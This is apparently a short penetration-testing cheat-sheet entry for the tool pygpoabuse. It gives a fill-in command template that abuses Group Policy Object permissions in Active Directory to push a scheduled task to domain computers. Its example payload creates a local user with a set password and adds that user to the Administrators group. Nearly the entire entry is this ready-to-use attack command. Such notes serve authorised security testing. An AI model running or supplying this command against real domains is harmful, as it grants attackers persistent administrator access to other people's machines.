# pygpoabuse
#target/remote #os/linux #cat/ad

## Create scheduled task (abuses gplink over computer object)
```
pygpoabuse -gpo-id <gpo_id> -command '<cmd>' -taskname '<task_name|beans>' -description '<description|beans>' <domain>/'<user>'<auth> -v
```

- cmd
net user pentest Password123! /add && net localgroup Administrators pentest /add
